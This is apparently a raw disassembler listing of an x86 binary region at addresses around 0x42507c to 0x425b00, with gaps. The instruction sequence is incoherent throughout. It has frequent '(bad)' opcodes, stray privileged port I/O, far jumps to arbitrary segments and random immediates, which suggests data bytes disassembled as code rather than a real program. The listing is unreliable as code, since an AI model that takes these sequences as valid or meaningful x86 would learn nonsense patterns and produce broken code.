  42507c:	loopne 0x42503e
  42507e:	in     eax,0xee
  425080:	sbb    BYTE PTR [edi-0x33],ah
  425083:	cs mov bl,0xef
  425086:	popa   
  425087:	push   0xc3414157
  42508c:	mov    eax,0xe31ba006
  425091:	and    DWORD PTR [edx-0x73407348],esp
  425097:	mov    eax,ds:0x92ad82b6
  42509c:	das    
  42509d:	ss xchg edi,eax
  42509f:	inc    esi
  4250a0:	pop    ds
  4250a1:	pop    esp
  4250a2:	lods   eax,DWORD PTR ds:[esi]
  4250a3:	in     eax,dx
  4250a4:	push   es
  4250a5:	jle    0x425054
  4250a7:	(bad)  
  4250a8:	mov    dh,ch
  4250aa:	inc    edx
  4250ab:	out    dx,al
  4250ac:	adc    cl,ah
  4250ae:	xchg   BYTE PTR [ecx],dl
  4250b0:	fist   DWORD PTR [ecx-0x46]
  4250b3:	push   ebx
  4250b4:	or     esp,DWORD PTR [ebp-0x6b]
  4250b7:	cmp    al,0x64
  4250b9:	jne    0x425133
  4250bb:	cmp    BYTE PTR [ebx+0xe32c86b],0x2c
  4250c2:	scas   al,BYTE PTR es:[edi]
  4250c3:	lds    ebx,FWORD PTR [ecx]
  4250c5:	push   0xa8bdcb9b
  4250ca:	mov    BYTE PTR [eax-0x77],ah
  4250cd:	adc    eax,0x1e4c0c3f
  4250d2:	and    esi,ebp
  4250d4:	cs enter 0x7d78,0xbd
  4250d9:	inc    esp
  4250da:	dec    ecx
  4250db:	pushf  
  4250dc:	mov    ds:0x705b916c,eax
  4250e1:	fst    QWORD PTR ds:0xe1675410
  4250e7:	sbb    esp,DWORD PTR [edx+ebx*2+0x10f30900]
  4250ee:	inc    ebp
  4250ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250f0:	fld    DWORD PTR [ecx-0x3bd07a4e]
  4250f6:	inc    ecx
  4250f7:	xchg   esi,eax
  4250f8:	mov    cl,BYTE PTR [esp+ecx*2]
  4250fb:	mov    edx,0x7a7d3c55
  425100:	mov    esi,0x18f9b819
  425105:	inc    edi
  425106:	repz in al,dx
  425108:	mov    al,cl
  42510a:	imul   esi,DWORD PTR [eax+0x14f8bda6],0x4f
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x143c:0x1cad92e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x3000001,al
  42518d:	adc    al,0xd4
  42518f:	mov    esi,0x7a5fee9a
  425194:	out    0xc2,eax
  425196:	sbb    BYTE PTR [ecx+ecx*8],ch
  425199:	adc    cl,BYTE PTR [esi+0x2c]
  42519c:	fwait
  42519d:	cdq    
  42519e:	fucom  st(3)
  4251a0:	jp     0x425182
  4251a2:	adc    eax,0xcd13c252
  4251a7:	mov    ebx,0x9576252e
  4251ac:	in     al,dx
  4251ad:	push   ebx
  4251ae:	gs test eax,0xbfd292e2
  4251b4:	ret    
  4251b5:	imul   al
  4251b7:	test   DWORD PTR [edi-0x3f],edi
  4251ba:	dec    edi
  4251bb:	lods   eax,DWORD PTR ds:[esi]
  4251bc:	push   ebp
  4251bd:	lock mov ebx,DWORD PTR [eax+0x65ebb94e]
  4251c4:	push   0xffffffb5
  4251c6:	cmc    
  4251c7:	fst    QWORD PTR [edi]
  4251c9:	cmc    
  4251ca:	syscall 
  4251cc:	mov    ah,0x50
  4251ce:	loope  0x425162
  4251d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251d1:	adc    al,0x8a
  4251d3:	aaa    
  4251d4:	sub    ecx,0x9cd89934
  4251da:	cmp    bh,BYTE PTR [edi+0x441bda96]
  4251e0:	sbb    eax,0xf9c08378
  4251e5:	pop    ebx
  4251e6:	mov    cl,0x66
  4251e8:	mov    ch,0xfb
  4251ea:	inc    esp
  4251eb:	and    esp,DWORD PTR [edx]
  4251ed:	aas    
  4251ee:	inc    ecx
  4251ef:	stc    
  4251f0:	sbb    al,0x87
  4251f2:	call   0x839d:0xfe193895
  4251f9:	loopne 0x425203
  4251fb:	inc    DWORD PTR [esi+0x5c67abca]
  425201:	xchg   esp,eax
  425202:	out    0x36,al
  425204:	xchg   ebx,eax
  425205:	(bad)  
  425207:	mov    esi,DWORD PTR [eax]
  425209:	nop
  42520a:	(bad)  
  42520b:	out    dx,eax
  42520c:	push   ebx
  42520d:	push   0x2ddf4fc8
  425212:	sbb    DWORD PTR [esi-0x22],esp
  425215:	mov    eax,ds:0x60ac7a7a
  42521a:	mov    es,WORD PTR [ecx-0x394381b5]
  425220:	push   ebp
  425221:	and    eax,edi
  425223:	adc    bl,dl
  425225:	sub    BYTE PTR [esi-0x77],al
  425228:	push   0xffffffb0
  42522a:	inc    eax
  42522b:	push   ss
  42522c:	retf   0x9c5e
  42522f:	ins    BYTE PTR es:[edi],dx
  425230:	jp     0x425233
  425232:	les    edi,FWORD PTR ds:0x3a977b49
  425238:	cmp    BYTE PTR [eax],al
  42523a:	dec    eax
  42523b:	in     eax,0xd7
  42523d:	sub    bl,BYTE PTR [edx-0x21cf6079]
  425243:	cld    
  425244:	jg     0x425242
  425246:	jnp    0x4252a2
  425248:	sbb    eax,esp
  42524a:	xor    DWORD PTR [ecx+0x34],0xffffff9c
  42524e:	add    dl,cl
  425250:	fisttp DWORD PTR [eax+0x59]
  425253:	jno    0x4251de
  425255:	sub    edx,DWORD PTR [edx-0x48]
  425258:	lahf   
  425259:	lods   eax,DWORD PTR ds:[esi]
  42525a:	and    ebp,edx
  42525c:	mov    bh,0x25
  42525e:	daa    
  42525f:	mov    bh,BYTE PTR [ebx]
  425261:	jmp    0xe50b:0x1833980b
  425268:	js     0x4252e2
  42526a:	fild   WORD PTR [ecx-0x6f30d4e4]
  425270:	cli    
  425271:	sub    eax,0x8c55fd01
  425276:	pop    eax
  425277:	xchg   esi,eax
  425278:	call   0x5580:0xe43fa6c1
  42527f:	adc    DWORD PTR [edi+0x3d],eax
  425282:	adc    cl,0xda
  425285:	add    eax,0x75f92ccf
  42528a:	add    dh,BYTE PTR [eax+0x7a]
  42528d:	fistp  WORD PTR [eax+0x44]
  425290:	jb     0x425292
	...
  4252f2:	add    BYTE PTR [eax],al
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	das    
  425301:	jae    0x425374
  425303:	ja     0x425379
  425305:	lea    eax,[ecx]
  425307:	add    BYTE PTR ds:0xf8000001,al
  42530d:	push   ecx
  42530e:	dec    edi
  42530f:	push   ecx
  425310:	sub    DWORD PTR [ebx+0x72520078],0x5e4f7761
  42531a:	or     ebp,DWORD PTR [ecx-0x9]
  42531d:	ins    BYTE PTR es:[edi],dx
  42531e:	ds push cs
  425320:	out    dx,al
  425321:	dec    eax
  425322:	xchg   edi,eax
  425323:	cmc    
  425324:	mov    dh,0x76
  425326:	mov    ebx,0x888899b0
  42532b:	inc    edx
  42532c:	and    edx,DWORD PTR [edx-0x21]
  42532f:	stos   DWORD PTR es:[edi],eax
  425330:	dec    edx
  425331:	push   0xffffffee
  425333:	inc    ecx
  425334:	xor    BYTE PTR [ecx-0x1da815e8],ah
  42533a:	(bad)  
  42533b:	cmc    
  42533c:	sub    DWORD PTR ds:0xb111f026,esi
  425342:	inc    esi
  425343:	cmp    edi,DWORD PTR [esi+esi*8+0x61]
  425347:	ins    BYTE PTR es:[edi],dx
  425348:	sub    al,0x34
  42534a:	bound  esi,QWORD PTR [ebx]
  42534c:	stc    
  42534d:	(bad)  
  42534e:	shl    DWORD PTR [ecx+0x638e2c8e],1
  425354:	(bad)  
  425355:	push   esi
  425356:	out    0x62,al
  425358:	loopne 0x4252e5
  42535a:	push   eax
  42535b:	and    cl,BYTE PTR [ecx-0xfd72900]
  425361:	ret    
  425362:	mov    ebx,0x98a217b4
  425367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425368:	test   al,0xce
  42536a:	cs mov esi,0x605b5e3f
  425370:	(bad)  [ebp+0x7d6d0803]
  425376:	pop    esp
  425377:	in     eax,0xaf
  425379:	outs   dx,DWORD PTR ds:[esi]
  42537a:	pop    esp
  42537b:	int3   
  42537c:	push   ss
  42537d:	les    esp,FWORD PTR [ebx-0x74]
  425380:	fcomp  DWORD PTR [ecx-0x30203996]
  425386:	push   edx
  425387:	scas   eax,DWORD PTR es:[edi]
  425388:	add    eax,0x51a6143
  42538d:	ror    BYTE PTR [edi],cl
  42538f:	push   ss
  425390:	(bad)  
  425392:	push   0x7
  425394:	jnp    0x42537b
  425396:	shr    BYTE PTR [ebx-0x30],0x8e
  42539a:	cmp    BYTE PTR [edx+0x4141c175],dh
  4253a0:	fld    st(7)
  4253a2:	jg     0x425347
  4253a4:	pop    ebx
  4253a5:	ins    BYTE PTR es:[edi],dx
  4253a6:	test   BYTE PTR [esi],al
  4253a8:	scas   al,BYTE PTR es:[edi]
  4253a9:	test   DWORD PTR [edx+0x5b2042f6],0xb672b3bf
  4253b3:	add    DWORD PTR [ebx+0x72],esi
  4253b6:	sub    cl,BYTE PTR [esi+0x3e79c463]
  4253bc:	pop    ds
  4253bd:	scas   al,BYTE PTR es:[edi]
  4253be:	sub    edx,edx
  4253c0:	out    dx,al
  4253c1:	adc    eax,0x2531ff92
  4253c6:	shr    DWORD PTR [ebp+edx*1+0x1],0xe
  4253cb:	lods   al,BYTE PTR ds:[esi]
  4253cc:	xchg   edi,edx
  4253ce:	xchg   ebp,eax
  4253cf:	fimul  WORD PTR [ecx+0xe3a5f30]
  4253d5:	dec    BYTE PTR [edx-0x31]
  4253d8:	sbb    eax,0xb19da9b9
  4253dd:	icebp  
  4253de:	xchg   ecx,eax
  4253df:	das    
  4253e0:	lea    ecx,[ebx+eax*2]
  4253e3:	push   eax
  4253e4:	xchg   ecx,eax
  4253e5:	mov    ch,0xdc
  4253e7:	push   ebx
  4253e8:	ret    
  4253e9:	cmp    ebp,edi
  4253eb:	xor    al,dh
  4253ed:	add    al,0x32
  4253ef:	mov    DWORD PTR [ecx],ecx
  4253f1:	push   ebp
  4253f2:	and    esp,DWORD PTR [ebx-0x62]
  4253f5:	cmp    al,0x68
  4253f7:	pop    ds
  4253f8:	rol    BYTE PTR [ecx+0x35],0x6c
  4253fc:	stc    
  4253fd:	and    eax,0x662652ac
  425402:	jg     0x425483
  425404:	pushf  
  425405:	or     esp,DWORD PTR [edi-0x27b67d63]
  42540b:	pop    edi
  42540c:	lea    edx,[ebx-0xf]
  42540f:	sub    ah,bl
	...
  425471:	add    BYTE PTR [eax],al
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esi,DWORD PTR [esi]
  425481:	adc    eax,DWORD PTR [ecx+0x18e7911]
  425487:	add    BYTE PTR ds:0x1000001,al
  42548d:	(bad)  
  42548e:	fs cli 
  425490:	(bad)  
  425491:	es or  eax,0xdf8fb69e
  425497:	mov    DWORD PTR fs:[ebp+0x48],eax
  42549b:	push   es
  42549c:	(bad)  
  42549e:	shr    BYTE PTR [ebp+0x35],0x9d
  4254a2:	call   0x62b0:0x6a49efc7
  4254a9:	and    eax,0xc9d0634
  4254ae:	data16 lahf 
  4254b0:	inc    edx
  4254b1:	dec    esp
  4254b2:	cmp    al,0xd6
  4254b4:	jl     0x425522
  4254b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254b7:	inc    edi
  4254b8:	fwait
  4254b9:	lock into 
  4254bb:	jle    0x425501
  4254bd:	push   esp
  4254be:	out    dx,al
  4254bf:	sbb    al,0xf0
  4254c1:	(bad)  
  4254c2:	mov    bl,0xc8
  4254c4:	mov    bl,0xae
  4254c6:	xchg   ebp,eax
  4254c7:	(bad)  
  4254c8:	pop    ss
  4254c9:	add    BYTE PTR es:[esi+0x1d],ch
  4254cd:	fiadd  WORD PTR [ebp-0x46b352b6]
  4254d3:	test   al,0xe4
  4254d5:	rcl    DWORD PTR [edi+0x7f],cl
  4254d8:	js     0x42550a
  4254da:	in     al,dx
  4254db:	jbe    0x4254cc
  4254dd:	and    BYTE PTR [edi],ch
  4254df:	jge    0x4254bb
  4254e1:	cmp    DWORD PTR [esi+0xc3f0888],ebp
  4254e7:	or     al,0xb
  4254e9:	aaa    
  4254ea:	cmp    DWORD PTR [esp+eax*4-0x61],0xa8c841a
  4254f2:	or     al,0xbd
  4254f4:	adc    BYTE PTR [edi+0x4a],bh
  4254f7:	xchg   edi,eax
  4254f8:	mov    ds:0xc58bf47c,eax
  4254fd:	pop    edi
  4254fe:	jl     0x4254e3
  425500:	mov    bl,0xff
  425502:	xor    BYTE PTR [esi-0x20],0x8d
  425506:	fcmovnu st,st(4)
  425508:	das    
  425509:	xor    BYTE PTR [edi-0x2640b77b],bl
  42550f:	aas    
  425510:	adc    eax,0x9ef66254
  425515:	rcr    DWORD PTR [esi],0x50
  425518:	in     al,dx
  425519:	xchg   esi,eax
  42551a:	adc    ebp,DWORD PTR [esi+edx*8]
  42551d:	sti    
  42551e:	aaa    
  42551f:	cdq    
  425520:	dec    ebp
  425521:	dec    edx
  425522:	dec    ebx
  425523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425524:	mov    al,ds:0xbd636b4f
  425529:	(bad)  
  42552a:	les    esp,FWORD PTR [ebx-0x616a1497]
  425530:	sbb    DWORD PTR [eax+0x5fd5c54],ecx
  425536:	push   ds
  425537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425538:	cmp    edi,edi
  42553a:	lahf   
  42553b:	mov    BYTE PTR [ebx-0x59],dh
  42553e:	or     eax,DWORD PTR [bp+si-0x285c]
  425543:	mov    edi,0xab619c29
  425548:	(bad)  [esi-0x48]
  42554b:	push   ds
  42554c:	cmp    ch,al
  42554e:	cmc    
  42554f:	inc    eax
  425550:	inc    edi
  425551:	adc    ch,dh
  425553:	cmp    al,BYTE PTR [edi-0x1cd76743]
  425559:	in     eax,dx
  42555a:	les    edx,FWORD PTR [eax+ebx*4-0x15]
  42555e:	imul   esp
  425560:	mov    dh,0x91
  425562:	cwde   
  425563:	outs   dx,BYTE PTR ds:[esi]
  425564:	enter  0x96bc,0x0
  425568:	shl    BYTE PTR [esi+edi*1],0x3c
  42556c:	rcl    BYTE PTR [ecx+0x9943360],1
  425572:	enter  0xba56,0x7
  425576:	xchg   esp,eax
  425577:	xchg   esi,eax
  425578:	rol    DWORD PTR [ecx-0x4e60a9d4],1
  42557e:	push   es
  42557f:	and    DWORD PTR [edi+0x5c],0x1f
  425583:	test   al,0xc7
  425585:	jg     0x42556a
  425587:	jle    0x4255b8
  425589:	or     eax,0x87c1e9a6
  42558e:	sub    ebx,edi
  425590:	add    al,BYTE PTR [eax]
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x8d84f13a
  425602:	inc    edx
  425603:	xchg   ebp,eax
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0x4e000001
  42560d:	pop    eax
  42560e:	out    0xb3,al
  425610:	dec    ebx
  425611:	ficomp DWORD PTR [ebp+0x60]
  425614:	imul   ebp,DWORD PTR ds:0x6e592913,0xffffffd5
  42561b:	jl     0x42567f
  42561d:	sub    BYTE PTR [esi+edx*1-0x13],0x46
  425622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425623:	mov    cl,0xa
  425625:	cmc    
  425626:	shr    DWORD PTR [edx+0x5ebd32fa],0xd
  42562d:	mov    es:0xa40301a9,al
  425633:	dec    ebx
  425634:	repnz xchg ebp,eax
  425636:	out    dx,al
  425637:	cmp    DWORD PTR [ebx-0x2e42c1b4],eax
  42563d:	gs out 0xc9,al
  425640:	repz jne 0x42565d
  425643:	mov    ds,WORD PTR [ecx]
  425645:	cmc    
  425646:	rol    DWORD PTR [esi+edx*2+0x1b],cl
  42564a:	pop    ebp
  42564b:	je     0x425689
  42564d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42564e:	mov    ch,0x53
  425650:	add    ebp,DWORD PTR [eax-0x1d]
  425653:	sub    al,0x40
  425655:	mov    DWORD PTR [edx+0x7ea0fb3f],ecx
  42565b:	add    dh,bl
  42565d:	arpl   dx,bx
  42565f:	push   ecx
  425660:	adc    ebx,0x6f
  425663:	scas   eax,DWORD PTR es:[edi]
  425664:	mov    edx,0x30e8dd2c
  425669:	xchg   ebp,eax
  42566a:	fild   DWORD PTR [edi*1-0x6b07c2aa]
  425671:	lea    esi,[ebp*2-0x5747ac22]
  425678:	sub    BYTE PTR [esp+eax*8],ah
  42567b:	lea    ebp,[eax]
  42567d:	imul   ebp,DWORD PTR [ebp-0x5f],0xf1f79295
  425684:	mov    ch,0x7d
  425686:	stc    
  425687:	cld    
  425688:	or     ch,BYTE PTR [ecx+0x7]
  42568b:	sbb    BYTE PTR [edx],dh
  42568d:	daa    
  42568e:	retf   
  42568f:	mov    al,0x2f
  425691:	in     al,dx
  425692:	push   ebp
  425693:	mov    cl,0x10
  425695:	mov    ch,BYTE PTR es:0xb762b278
  42569c:	ds inc ecx
  42569e:	fisub  DWORD PTR [eax+ebx*1+0x485aab05]
  4256a5:	mov    ch,0x82
  4256a7:	and    BYTE PTR [ecx-0x3e94c3cb],cl
  4256ad:	and    esp,DWORD PTR [edx]
  4256af:	lods   al,BYTE PTR ds:[esi]
  4256b0:	fadd   QWORD PTR fs:[eax+0x79ddac7]
  4256b7:	ror    ch,0xec
  4256ba:	dec    edx
  4256bb:	add    al,0x32
  4256bd:	and    BYTE PTR [esi+0x78],0x1
  4256c1:	mov    bl,0xe8
  4256c3:	mov    ah,0xe1
  4256c5:	ret    0xd0c7
  4256c8:	adc    eax,0xa48e1873
  4256cd:	std    
  4256ce:	icebp  
  4256cf:	test   DWORD PTR [ebx+edi*1-0x7],0x6230995
  4256d7:	(bad)  
  4256d8:	stc    
  4256d9:	mov    eax,ds:0x379a9b3f
  4256de:	mov    ch,BYTE PTR [ebx-0x2e]
  4256e1:	in     al,0x94
  4256e3:	sub    ebp,esi
  4256e5:	ret    
  4256e6:	push   edx
  4256e7:	dec    ebp
  4256e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256e9:	pop    ss
  4256ea:	test   BYTE PTR [esi+0x1f],al
  4256ed:	mov    ecx,0xa6194039
  4256f2:	dec    esi
  4256f3:	mov    ebx,0x27a3dec3
  4256f8:	retf   
  4256f9:	mov    dh,0xe8
  4256fb:	xor    BYTE PTR [esi+0x42bfcb91],dh
  425701:	mov    ds:0xb9b4e9b7,eax
  425706:	ret    
  425707:	outs   dx,BYTE PTR ds:[esi]
  425708:	push   esi
  425709:	mov    BYTE PTR [esi],0xd0
  42570c:	add    al,ah
  42570e:	inc    ecx
  42570f:	cmp    DWORD PTR [eax+eax*1],0x0
	...
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x42e85e74
  425783:	pop    es
  425784:	adc    DWORD PTR [eax+0x1050001],0x0
  42578b:	add    BYTE PTR [ecx+0x37],bl
  42578e:	mov    ebx,0x6d60e4d7
  425793:	mov    edi,0xbd87498
  425798:	mov    cl,0x54
  42579a:	(bad)  
  42579b:	cld    
  42579c:	sbb    BYTE PTR [ebp-0x45331845],dl
  4257a2:	fstp   TBYTE PTR [ebx+0x28]
  4257a5:	mov    dl,0x16
  4257a7:	jp     0x4257ce
  4257a9:	test   al,0x24
  4257ab:	fcmovu st,st(4)
  4257ad:	mov    dl,0x9e
  4257af:	jnp    0x425776
  4257b1:	stc    
  4257b2:	xchg   ebp,eax
  4257b3:	and    edx,DWORD PTR [ebx-0x29d7cc42]
  4257b9:	jle    0x425757
  4257bb:	dec    esp
  4257bc:	gs fwait
  4257be:	xchg   ebx,eax
  4257bf:	aaa    
  4257c0:	jp     0x425819
  4257c2:	ds jae 0x42578d
  4257c5:	gs push esi
  4257c7:	std    
  4257c8:	ret    
  4257c9:	and    ah,bh
  4257cb:	pusha  
  4257cc:	mov    ebx,0xd7123dea
  4257d1:	fdivr  QWORD PTR [eax]
  4257d3:	sti    
  4257d4:	dec    esp
  4257d5:	adc    BYTE PTR [esi+ebx*8+0x2],bh
  4257d9:	xor    eax,0xd0fc7f07
  4257de:	adc    cl,BYTE PTR [ebp+0x78]
  4257e1:	xor    al,0xf7
  4257e3:	test   eax,0xa53bb4d5
  4257e8:	mov    esi,0xb53a6a67
  4257ed:	pop    esp
  4257ee:	add    dl,BYTE PTR [edx+0x13]
  4257f1:	pop    es
  4257f2:	sub    BYTE PTR [ebx-0x1a7b4702],bh
  4257f8:	sahf   
  4257f9:	es in  al,0x57
  4257fc:	into   
  4257fd:	data16 add cl,BYTE PTR ds:0x874bdc9c
  425804:	mov    dl,cl
  425806:	arpl   WORD PTR [edx-0x80],di
  425809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42580a:	mov    al,0xee
  42580c:	sbb    eax,0x10b96df0
  425811:	sub    ah,BYTE PTR [eax+0x5a]
  425814:	test   BYTE PTR ds:0xe603edf6,0x49
  42581b:	stos   DWORD PTR es:[edi],eax
  42581c:	test   eax,0xeb36c075
  425821:	iret   
  425822:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  425824:	push   edx
  425825:	loop   0x4257c7
  425827:	xor    al,0x71
  425829:	cmp    dl,ch
  42582b:	inc    edi
  42582c:	fs adc eax,0x94f9d1c6
  425832:	and    al,0xed
  425834:	sub    al,0xe5
  425836:	inc    esp
  425837:	xor    eax,0x62ec5395
  42583c:	(bad)  
  42583d:	adc    edi,DWORD PTR [ebx-0x2ef48e66]
  425843:	clc    
  425844:	fmul   DWORD PTR [edx-0xaa966b9]
  42584a:	xchg   edi,eax
  42584b:	int3   
  42584c:	scas   al,BYTE PTR es:[edi]
  42584d:	mov    BYTE PTR [eax-0x6bc21e4a],dh
  425853:	mov    edx,0x6696c40b
  425858:	(bad)  [esi+0x266e5537]
  42585e:	inc    ebp
  42585f:	out    0x3,al
  425861:	arpl   WORD PTR [ecx-0x1aefb0ca],ax
  425867:	pop    ecx
  425868:	enter  0x9432,0x91
  42586c:	pop    ds
  42586d:	mov    cl,0x3d
  42586f:	les    esi,FWORD PTR [ecx+0x2665c5e5]
  425875:	outs   dx,BYTE PTR ds:[esi]
  425876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425877:	retf   0xf77
  42587a:	xchg   esi,eax
  42587b:	stos   DWORD PTR es:[edi],eax
  42587c:	dec    edx
  42587d:	xor    eax,0xbb5af3c8
  425882:	push   edi
  425883:	or     eax,0x58b2a90a
  425888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425889:	or     ebp,DWORD PTR [ebx]
  42588b:	mov    BYTE PTR [esi*4+0x5fb12d],ah
	...
  4258f2:	add    BYTE PTR [eax],al
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	or     DWORD PTR [ebp-0x6e775b5c],edi
  425906:	add    DWORD PTR [eax],eax
  425908:	add    eax,0x79000001
  42590d:	push   eax
  42590e:	outs   dx,BYTE PTR ds:[esi]
  42590f:	ror    BYTE PTR [ecx+0x286eace],0x97
  425916:	(bad)  
  425917:	lods   al,BYTE PTR ds:[esi]
  425918:	push   ds
  425919:	(bad)  
  42591a:	or     eax,0x72b3f757
  42591f:	sub    al,0xd
  425921:	inc    ebp
  425922:	daa    
  425923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425924:	sub    esi,ebp
  425926:	loop   0x4258b8
  425928:	sub    eax,0x6191d355
  42592d:	ficomp DWORD PTR [edi+esi*2-0x4a]
  425931:	jno    0x42599f
  425933:	adc    eax,DWORD PTR [esi+0x62]
  425936:	cmp    BYTE PTR [esi],0x8b
  425939:	cmp    al,0xb5
  42593b:	(bad)  [ecx+ebx*8+0x6a]
  42593f:	pop    eax
  425940:	or     dl,al
  425942:	adc    al,0xcd
  425944:	aaa    
  425945:	in     eax,dx
  425946:	pop    esi
  425947:	cmp    edi,DWORD PTR [ebp+0x36232714]
  42594d:	push   0x5c
  42594f:	repnz ss sub al,0xad
  425953:	hlt    
  425954:	rol    ah,0xa6
  425957:	xor    DWORD PTR [ecx],0x47
  42595a:	pushf  
  42595b:	(bad)  
  42595c:	out    dx,al
  42595d:	jle    0x4258e7
  42595f:	into   
  425960:	push   0x3989f637
  425965:	adc    cl,BYTE PTR [ebx-0x57e5f00c]
  42596b:	jecxz  0x425995
  42596d:	mov    ah,BYTE PTR [ebx+0x6f]
  425970:	mov    ebp,0xf8b00e7
  425975:	pop    ss
  425976:	ins    BYTE PTR es:[edi],dx
  425977:	call   0x89f49b3
  42597c:	xor    esi,ecx
  42597e:	rcl    DWORD PTR [edx-0x5c6c00b1],1
  425984:	xor    DWORD PTR [edi],esp
  425986:	call   0x7ca4:0xd75976f8
  42598d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42598e:	mov    ebp,DWORD PTR [ecx+edx*4+0x444d28f9]
  425995:	mov    bl,0x7e
  425997:	scas   eax,DWORD PTR es:[edi]
  425998:	sub    eax,edx
  42599a:	pushf  
  42599b:	nop
  42599c:	cli    
  42599d:	aad    0x16
  42599f:	jb     0x425967
  4259a1:	aas    
  4259a2:	mov    cl,0xf5
  4259a4:	cwde   
  4259a5:	push   edi
  4259a6:	or     DWORD PTR ds:0x91511df5,ebp
  4259ac:	pop    edi
  4259ad:	jge    0x425997
  4259af:	inc    ebp
  4259b0:	xchg   edx,eax
  4259b1:	les    edx,FWORD PTR [ebx-0x3cb0f918]
  4259b7:	pop    ds
  4259b8:	xchg   edx,eax
  4259b9:	inc    ebx
  4259ba:	call   0x91b5:0xb88027ea
  4259c1:	sbb    ch,BYTE PTR [ebp+0x34]
  4259c4:	cmp    edi,ebx
  4259c6:	dec    ebp
  4259c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259c8:	xchg   ebx,eax
  4259c9:	inc    edx
  4259ca:	pop    ebp
  4259cb:	sahf   
  4259cc:	sbb    eax,0x92ae998e
  4259d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259d2:	or     DWORD PTR [ebp+0x47],0x1aba1bff
  4259d9:	xor    ebp,DWORD PTR [ecx+0x404998a5]
  4259df:	std    
  4259e0:	retf   
  4259e1:	xor    dh,BYTE PTR [edi+0x705c6e0c]
  4259e7:	cmc    
  4259e8:	jge    0x425a02
  4259ea:	xor    dl,BYTE PTR [ebp-0x4d]
  4259ed:	sub    ebp,0x26
  4259f0:	xor    DWORD PTR [ecx+0x13],esp
  4259f3:	test   al,0xd7
  4259f5:	stc    
  4259f6:	or     ch,BYTE PTR [eiz*8-0x31d51be2]
  4259fd:	sub    BYTE PTR [esi-0x3f],dh
  425a00:	dec    eax
  425a01:	dec    esi
  425a02:	xchg   edi,eax
  425a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a04:	cld    
  425a05:	sub    cl,BYTE PTR [ecx]
  425a07:	enter  0x5ef5,0x8f
  425a0b:	mov    edi,0xd78cbd6b
  425a10:	popf   
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x3d397767]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	or     bl,dl
  425a8e:	(bad)  
  425a8f:	or     DWORD PTR [edi],esi
  425a91:	xchg   BYTE PTR [edx-0x51],al
  425a94:	cli    
  425a95:	arpl   WORD PTR [ebx+0x3b],bp
  425a98:	jge    0x425a1c
  425a9a:	xor    al,0xd1
  425a9c:	mov    dl,BYTE PTR [esi-0x3b43f3e7]
  425aa2:	lahf   
  425aa3:	test   eax,0xf4dffc3c
  425aa8:	pop    edx
  425aa9:	mov    ebx,0x7b24c495
  425aae:	stos   DWORD PTR es:[edi],eax
  425aaf:	sub    DWORD PTR [ebp+esi*1+0x5af99186],esi
  425ab6:	sahf   
  425ab7:	out    dx,al
  425ab8:	and    BYTE PTR [edi+0x7e3e3115],dl
  425abe:	sub    al,dl
  425ac0:	outs   dx,DWORD PTR ds:[esi]
  425ac1:	mov    cl,0x51
  425ac3:	fs call 0xf08123a5
  425ac9:	adc    ch,BYTE PTR [edi-0xf817813]
  425acf:	jmp    0xe440:0x5f09db28
  425ad6:	and    ah,0x5e
  425ad9:	xor    DWORD PTR [edx-0x36c1d02],0xa678e612
  425ae3:	jecxz  0x425a9b
  425ae5:	adc    esi,edi
  425ae7:	mov    cl,0xc8
  425ae9:	sub    al,BYTE PTR [edx+0x732aeb2]
  425aef:	jp     0x425b0e
  425af1:	xchg   ebp,eax
  425af2:	loop   0x425b6e
  425af4:	xchg   DWORD PTR [esi+ebp*8],eax
  425af7:	sub    ecx,esi
  425af9:	or     al,0xe0
  425afb:	sub    eax,0x9de7abdd
  425b00:	mov    ebp,0x62c8f631
